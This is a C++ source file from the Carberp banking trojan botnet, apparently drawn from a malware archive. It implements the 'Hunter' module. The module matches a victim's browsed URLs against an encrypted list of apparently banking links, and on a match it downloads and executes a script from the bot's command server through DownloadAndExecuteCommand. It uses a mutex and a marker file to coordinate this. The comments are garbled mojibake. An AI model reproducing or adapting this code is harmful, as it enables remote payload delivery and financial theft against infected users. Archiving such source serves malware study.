/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "Hunter.h"
#include "Memory.h"
#include "Utils.h"
#include "GetApi.h"
#include "BotHTTP.h"
#include "Task.h"
#include "StealthBrowser.h"
#include "BackConnect.h"

#include "Modules.h"
#include "Config.h"

const static char HunterMutexName[] = {'H', 'n', 'T',  0};
const static WCHAR HunterFileName[] = {'h', 'n', 't', '.', 'd', 'a', 't',  0};


//������� ���� � ������ �� ���
//�� ������ ������� ��� ���� � �������,�������� � ����� ����� �� � ��������� ��
void Hunting()
{
	PCHAR URL = GetBotScriptURL(SCRIPT_HUNTER);
	if (URL == NULL) return;

    DownloadAndExecuteCommand(NULL, URL);
}

bool HunterFileExists()
{
	// ������� ���������� ������ ���� � ������� ����� ���������� ����,
	// ������ �������
	return isFileExists(0x001a /* �������� � ���� ��� ��� ����� */, (PWCHAR)HunterFileName);
	// ��� ����� �������� ��� ���� ����� ��� ������ ������� ������ ������� ����, 
	// � ��� ��������� �������� ��� ������� ����� ����� ������� ��
	// ������ ���� ���������
}

DWORD WINAPI HuntThred( LPVOID lpData )
{
//���� ���� ���� �� �����,�� ���� �� ���� ������ � ��������� ��
//������ ����� ������ 127.0.0.1:5555
	if (HunterFileExists())
	{		
		Hunting();
		return 0;
	}	
	
	HANDLE tmp;
	while(true)
	{
		tmp= (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS,FALSE, (PCHAR)HunterMutexName);
		if ((DWORD)pWaitForSingleObject(tmp, INFINITE))
		{	
			if (HunterFileExists())//&&!IsSbStarted()
			{
				Hunting();
			}
			pSleep(90);
		}
		else
		{		
			Hunting();
			pCloseHandle(tmp);
			FileCreateInFolder(0x001a, (PWCHAR)HunterFileName,NULL,0);
			break;
		}
	}	
	return 0;
}

// ����� ������ ��������. ������ ������ ������ ������������� ������� �������
// ����� ��������� ������ ������ ������ ��� ������� �������
// URL1\0URL2\0URL3\0\0

char HunterLinks[HUNTER_PARAM_SIZE] = HUNTER_PARAM_NAME;

#define HUNTER_LINKS_HASH 0x9152F40C /* __BNK__HUNTER__LINKS */


// ������� ��������� ������������ �������� �� ��������
bool HunterCompleted = false;




//-----------------------------------------------------------------------------
void HunterSignal()
{
	// ������� ���������� ��������� ������� � ���������� ������
	HANDLE Handle = (HANDLE)pCreateMutexA(NULL, FALSE, (PCHAR)HunterMutexName);
	pSleep(100);
	pCloseHandle(Handle);
}

//-----------------------------------------------------------------------------

void URLHunter::Initialize()
{
	// �������������� ������ �������
	HunterCompleted = HunterFileExists();
}

//-----------------------------------------------------------------------------

void URLHunter::CheckURL(PCHAR URL)
{
	// ��������� ���������� ������ � ����� ������� �� ������ ������ ��������
	if (HunterCompleted || STR::IsEmpty(URL) ||
		CalcHash(HunterLinks) == HUNTER_LINKS_HASH)
		return;

	// ���������� ��� ������ � ������� ������ ���
	PCHAR Tmp = HunterLinks;

	PCHAR DecryptedURL = STR::Alloc(HUNTER_PARAM_SIZE);

	while (*Tmp != NULL)
	{
		m_memset(DecryptedURL, 0, HUNTER_PARAM_SIZE);
		DecryptStr(Tmp, DecryptedURL);

		if (CompareUrl(DecryptedURL, URL))
		{
			// ������������� �� ������� �����
			HunterSignal();

			// ������������� ������� ������������ ��������
			HunterCompleted = true;

			break;
        }

		// ��������� � ��������� ������
		Tmp = STR::End(Tmp); // ��������� � ����� ������
		Tmp++; // ����������
	}

	STR::Free(DecryptedURL);
}

//-----------------------------------------------------------------------------

void URLHunter::StartClient()
{
	// ��������� ������ �������� ������� ��������
	// �������� ������ � ������ ��������
	StartThread(HuntThred,NULL);
}
